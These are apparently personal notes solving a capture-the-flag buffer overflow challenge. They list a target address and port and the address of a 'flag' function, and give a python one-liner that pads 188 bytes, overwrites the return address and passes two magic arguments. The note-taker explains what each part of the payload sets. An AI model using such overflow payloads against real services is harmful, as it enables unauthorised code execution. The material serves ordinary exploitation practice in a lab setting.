# target
139.59.176.130:31467

# addresses
```
flag: 0x080491e2
args: 0xdeadbeef
args: 0xc0ded00d
```

# bof payload
```sh
python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 188 +  b"\xe2\x91\x04\x08" + b"A" * 4 +  b"\xef\xbe\xad\xde" + b"\x0d\xd0\xde\xc0")'

sets returns address to 0x080491e2 (flag function)
sets the first argument to 0xdeadbeef
sets the second arguemnt to 0xc0ded00d
```